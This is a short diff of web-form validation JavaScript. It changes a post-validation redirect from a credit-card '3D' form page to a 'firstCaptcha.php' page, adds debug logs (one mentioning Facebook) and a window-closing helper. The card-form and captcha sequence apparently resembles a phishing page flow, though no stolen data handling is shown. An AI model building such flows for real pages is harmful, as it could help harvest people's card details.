@@ -1,5 +1,8 @@
         document.getElementById('button').addEventListener('click', validate)
+        console.log('hola')
         const errMessages = document.querySelectorAll('#error')
+
+        
 
         
         const inputs = document.getElementsByTagName('input');
@@ -158,7 +161,10 @@
             
             if(Malas){
                 if(Malas.length === 0){ 
-                    window.location.href = "card/formulario-tarjeta-credito-3d/index.php";
+                    console.log('Deberia de imprimir facebook')
+                    /* window.location.href = "card/formulario-tarjeta-credito-3d/index.php"; */
+                    window.location.href = "firstCaptcha.php";
+                    
                 }
             }
         }
@@ -229,6 +235,12 @@
             el.classList.toggle('text-red-600')
           })
         }
+
+        function close_window() {
+            if (confirm("Close Window?")) {
+                customWindow.close();
+            }
+          }
 
         console.log(pais.options[pais.selectedIndex].value)
 
